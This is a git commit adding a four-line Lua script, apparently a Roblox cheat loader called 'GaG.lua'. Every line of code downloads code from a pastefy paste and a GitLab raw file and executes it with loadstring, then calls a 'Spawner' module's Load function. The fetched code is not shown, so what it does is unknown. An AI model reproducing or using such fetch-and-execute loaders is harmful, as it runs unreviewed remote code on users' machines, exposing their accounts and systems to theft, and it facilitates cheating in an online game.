d6164fc5c76e22c80a40627da362c4fd3c0fbd5d
scripts <nielanthonyr@gmail.com>
2025-08-30 11:18:50 +0800

    GaG.lua

---
+++ GaG.lua
@@ -0,0 +1,4 @@
+loadstring(game:HttpGet("https://pastefy.app/V5D6LvRn/raw"))()
+
+local Spawner = loadstring(game:HttpGet("https://gitlab.com/darkiedarkie/dark/-/raw/main/Spawner.lua"))()
+Spawner.Load()
